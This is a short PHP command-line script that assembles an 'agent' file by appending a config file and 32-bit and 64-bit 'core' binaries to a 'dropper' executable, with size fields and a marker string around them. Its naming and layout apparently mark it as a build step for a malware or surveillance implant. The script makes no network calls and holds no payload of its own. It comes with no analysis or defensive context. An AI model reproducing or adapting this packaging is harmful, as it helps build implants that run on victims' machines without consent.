#!/usr/bin/env php
<?php

$dropper = $argv[1];
$core32 = $argv[2];
$core64 = $argv[3];
$config = $argv[4];

$agent = file_get_contents($dropper).
         "BmFyY5JhOGhoZjN1".
         "testthat".
         pack('V', filesize($config)).
         file_get_contents($config).
         pack('V', filesize($core32)).
         file_get_contents($core32).
         pack('V', filesize($core64)).
         file_get_contents($core64).
         "BmFyY5JhOGhoZjN1".
         pack('V', filesize($dropper));

file_put_contents("agent", $agent);

?>
